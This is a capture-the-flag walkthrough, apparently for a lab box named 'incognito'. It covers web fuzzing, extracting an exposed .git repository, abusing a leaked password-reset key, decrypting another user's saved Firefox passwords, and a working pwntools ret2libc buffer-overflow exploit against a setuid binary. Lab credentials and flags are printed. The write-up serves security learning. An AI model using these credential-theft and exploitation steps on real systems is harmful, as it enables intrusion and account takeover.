# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |
| 8081 | HTTP |



# RECONNAISSANCE
---

We got two web applications, if we visit the web application at port `80`, we can see this:

![Pasted image 20250424125335.png](../../IMAGES/Pasted%20image%2020250424125335.png)

We can try fuzzing:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.153.96/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.153.96/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

old [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 391ms]
```


We got an `old` directory, let's check it out:

![Pasted image 20250424125832.png](../../IMAGES/Pasted%20image%2020250424125832.png)


![Pasted image 20250424125854.png](../../IMAGES/Pasted%20image%2020250424125854.png)

![Pasted image 20250424125908.png](../../IMAGES/Pasted%20image%2020250424125908.png)

We can try fuzzing further on the directory:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.153.96/old/FUZZ" -ic -c -t 200 -e .git,.php,.html,.js

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.153.96/old/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .git .php .html .js
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 163ms]
.html [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 399ms]
templates [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 160ms]
```

We got a `.git` folder, let's get it using `GitHack` and check the contents:

![Pasted image 20250424130921.png](../../IMAGES/Pasted%20image%2020250424130921.png)

There seems to be a password showing functionality on the other port web application, let's check the logs with:

```
git log -p > log.txt
```

We can now grep it to search if we got any password or key:

```bash
cat log.txt | grep "key"
- xhttp.send('{"key":"NULL"}') //Removed the API Key to stop the forget password functionality
- if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
- if(data['key']=='abcd'):
+ if(data['key']=='7454c262d0d5a3a0c0b678d6c0dbc7ef'):
+ xhttp.send('{"key":"NULL"}') //Removed the API Key to stop the forget password functionality
+ if(data['key']=='abcd'):
```

We got some sort of key, it says it can be used at the forgot password functionality, let's go to the other website and check it out:



![Pasted image 20250424131726.png](../../IMAGES/Pasted%20image%2020250424131726.png)

Let's submit the request to our proxy:

![Pasted image 20250424131923.png](../../IMAGES/Pasted%20image%2020250424131923.png)

As seen, we need the key we found earlier, let's use it and send the request again:

![Pasted image 20250424132020.png](../../IMAGES/Pasted%20image%2020250424132020.png)

It changed, let's proceed to exploitation.




# EXPLOITATION
---

Since I used a test username: `1`, we can notice it says `Invalid Username`, let's use `caido` automate function to brute force the username:


![Pasted image 20250424132423.png](../../IMAGES/Pasted%20image%2020250424132423.png)

Let's start the attack, we can use the following query:

```httpql
resp.raw.ncont:"Invalid"
```

![Pasted image 20250424132609.png](../../IMAGES/Pasted%20image%2020250424132609.png)


If we check the request:

![Pasted image 20250424132623.png](../../IMAGES/Pasted%20image%2020250424132623.png)

There we go, we got credentials:

```
tommy:DevMakesStuff01
```

These credentials don't work at the login page:

![Pasted image 20250424132817.png](../../IMAGES/Pasted%20image%2020250424132817.png)

We can try them out at `ssh`:


![Pasted image 20250424132948.png](../../IMAGES/Pasted%20image%2020250424132948.png)

They worked, let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---

We can read `user.txt` now:

```
tommy@incognito:~$ cat user.txt
7ba840222ecbdb57af4d24eb222808ad
```

Let's use `linpeas` to search any PE vector:

![Pasted image 20250424133902.png](../../IMAGES/Pasted%20image%2020250424133902.png)

We got another user called `carlJ`, let's check if we can visualize its home:

![Pasted image 20250424133944.png](../../IMAGES/Pasted%20image%2020250424133944.png)

We got a `.mozilla` folder, with this, we can use a tool called `firefox-decrypt`

![Pasted image 20250424134900.png](../../IMAGES/Pasted%20image%2020250424134900.png)

Let's clone it to our machine and do the following:

```bash
git clone https://github.com/unode/firefox_decrypt
scp -r tommy@IP:/home/carlJ/.mozilla/firefox .
```

![Pasted image 20250424135714.png](../../IMAGES/Pasted%20image%2020250424135714.png)

We get prompt with a password, we can try some basic password and notice the password for this is:

```
password1
```

```python
python3 firefox_decrypt.py ../firefox
Select the Mozilla profile you wish to decrypt
1 -> 45ir4czt.default
2 -> 0ryxwn4c.default-release
2

Primary Password for profile ../firefox/0ryxwn4c.default-release:

Website: https://incognito.com
Username: 'dev'
Password: 'Pas$w0RD59247'
```

We got credentials, let's change our ssh session:

![Pasted image 20250424140529.png](../../IMAGES/Pasted%20image%2020250424140529.png)

We can now visualize the `mailing` directory:

![Pasted image 20250424143437.png](../../IMAGES/Pasted%20image%2020250424143437.png)

We got a binary named `smail` in here, let's check the strings:

```bash
strings smail
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
stdin
fgetc
fgets
__libc_start_main
GLIBC_2.7
GLIBC_2.2.5
__gmon_start__
AWAVI
AUATL
[]A\A]A^A_
Changed
What do you wanna do
1-Send Message
2-Change your Signature
What message you want to send(limit 80)
Sent!
Write your signature...
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
ctf.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
puts@@GLIBC_2.2.5
stdin@@GLIBC_2.2.5
_edata
fgetc@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
fgets@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
_dl_relocate_static_pie
__bss_start
main
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
```

We can try `ret2libc` buffer overflow, this is due to the message `limit(80)`, if we use the binary and do this, we can see the following:


![Pasted image 20250424145012.png](../../IMAGES/Pasted%20image%2020250424145012.png)

We got `segmentation fault (core dumped)`, we can do the following to get each address:

```
ldd smail
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
ROPgadget --binary smail | grep rdi
objdump -d smail | grep ret
```

let's use the following payload:

```python
#!/usr/bin/env python3

from pwn import *

exploit = process('./smail')

base = 0x7ffff79e2000
sys = base + 0x4f550
shell = base + 0x1b3e1a

rop_rdi = 0x4007f3

payload = b'\x69' * 72
payload += p64(0x400556)
payload += p64(rop_rdi)
payload += p64(shell)
payload += p64(sys)
payload += p64(0x0)


exploit.clean()
exploit.sendline("2")
exploit.sendline(payload)
exploit.interactive()
```

![Pasted image 20250424145727.png](../../IMAGES/Pasted%20image%2020250424145727.png)

If we get this, we need to go to `~/.pwn.conf` and add:

```
[update]
interval=never
```

Let's run the script again:

![Pasted image 20250424145803.png](../../IMAGES/Pasted%20image%2020250424145803.png)

There we go, let's read root flag and finish:

```
$ cat /root/root.txt
f21979de76c0302154cc001884143ab2
```

![Pasted image 20250424145835.png](../../IMAGES/Pasted%20image%2020250424145835.png)

